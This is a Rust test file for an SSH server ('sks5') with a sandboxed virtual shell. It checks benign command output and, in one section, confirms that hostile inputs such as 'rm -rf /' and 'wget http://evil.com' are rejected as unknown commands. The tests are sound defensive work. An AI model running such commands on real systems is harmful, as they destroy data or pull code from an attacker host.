#[allow(dead_code, unused_imports)]
mod helpers;

use helpers::*;
use std::sync::Arc;
use tokio::time::Duration;

async fn exec_command(port: u16, password: &str, command: &str) -> String {
    let client_config = Arc::new(russh::client::Config::default());
    let mut handle = russh::client::connect(
        client_config,
        format!("127.0.0.1:{}", port),
        TestClientHandler,
    )
    .await
    .unwrap();

    let ok = handle
        .authenticate_password("testuser", password)
        .await
        .unwrap();
    assert!(ok.success(), "auth should succeed");

    let channel = handle.channel_open_session().await.unwrap();

    // Send exec request
    channel.exec(true, command).await.unwrap();

    // Read output
    let mut stream = channel.into_stream();
    let mut buf = vec![0u8; 4096];
    let mut output = String::new();

    loop {
        match tokio::time::timeout(
            Duration::from_secs(3),
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => output.push_str(&String::from_utf8_lossy(&buf[..n])),
            Ok(Err(_)) => break,
            Err(_) => break, // timeout
        }
    }

    output
}

async fn shell_command(port: u16, password: &str, command: &str) -> String {
    let client_config = Arc::new(russh::client::Config::default());
    let mut handle = russh::client::connect(
        client_config,
        format!("127.0.0.1:{}", port),
        TestClientHandler,
    )
    .await
    .unwrap();

    let ok = handle
        .authenticate_password("testuser", password)
        .await
        .unwrap();
    assert!(ok.success());

    let channel = handle.channel_open_session().await.unwrap();
    channel.request_shell(true).await.unwrap();

    // Read MOTD + prompt first (may arrive in multiple packets)
    let mut stream = channel.into_stream();
    let mut buf = vec![0u8; 4096];
    let mut initial = String::new();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    loop {
        match tokio::time::timeout_at(
            deadline,
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(n)) if n > 0 => {
                initial.push_str(&String::from_utf8_lossy(&buf[..n]));
                if initial.contains("$ ") {
                    break;
                }
            }
            _ => break,
        }
    }

    // Send command + Enter
    let cmd_bytes = format!("{}\r", command);
    tokio::io::AsyncWriteExt::write_all(&mut stream, cmd_bytes.as_bytes())
        .await
        .unwrap();

    // Read response
    let mut output = String::new();
    loop {
        match tokio::time::timeout(
            Duration::from_secs(2),
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                output.push_str(&String::from_utf8_lossy(&buf[..n]));
                // Stop when we see another prompt
                if output.contains("$") && output.len() > 5 {
                    break;
                }
            }
            Ok(Err(_)) => break,
            Err(_) => break,
        }
    }

    output
}

// ---------------------------------------------------------------------------
// exec_request tests
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_whoami() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "whoami").await;
    assert!(
        output.contains("testuser"),
        "whoami should return username, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_hostname() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "hostname").await;
    assert!(
        output.contains("e2e-test"),
        "hostname should return configured hostname, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_echo() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "echo hello world").await;
    assert!(
        output.contains("hello world"),
        "echo should output the text, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_id() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "id").await;
    assert!(
        output.contains("uid=1000(testuser)"),
        "id should contain uid, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_uname() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "uname").await;
    assert!(
        output.contains("sks5"),
        "uname should return sks5, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_pwd() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "pwd").await;
    assert!(
        output.contains("/home/testuser"),
        "pwd should return home dir, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_ls() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    // ls on / should show directories like bin, etc, home
    let output = exec_command(port, "pass", "ls /").await;
    assert!(
        output.contains("etc") || output.contains("home") || output.contains("bin"),
        "ls / should list virtual FS root, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_env() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "env").await;
    assert!(
        output.contains("HOME=") && output.contains("USER=testuser"),
        "env should contain HOME and USER, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_help() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "help").await;
    assert!(
        output.contains("ls") && output.contains("cd"),
        "help should list available commands, got: {}",
        output
    );
}

// ---------------------------------------------------------------------------
// Dangerous commands blocked
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_rm_blocked() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "rm -rf /").await;
    assert!(
        output.contains("command not found"),
        "rm should be blocked, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_bash_blocked() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "bash").await;
    assert!(
        output.contains("command not found"),
        "bash should be blocked, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_wget_blocked() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "wget http://evil.com").await;
    assert!(
        output.contains("command not found"),
        "wget should be blocked, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_python_blocked() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "python -c 'import os'").await;
    assert!(
        output.contains("command not found"),
        "python should be blocked, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_unknown_command() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "nonexistentcmd").await;
    assert!(
        output.contains("command not found"),
        "unknown command should return not found, got: {}",
        output
    );
}

// ---------------------------------------------------------------------------
// Interactive shell tests
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_shell_whoami() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "whoami").await;
    assert!(
        output.contains("testuser"),
        "shell whoami should contain username, got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_echo() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "echo test123").await;
    assert!(
        output.contains("test123"),
        "shell echo should contain text, got: {}",
        output
    );
}
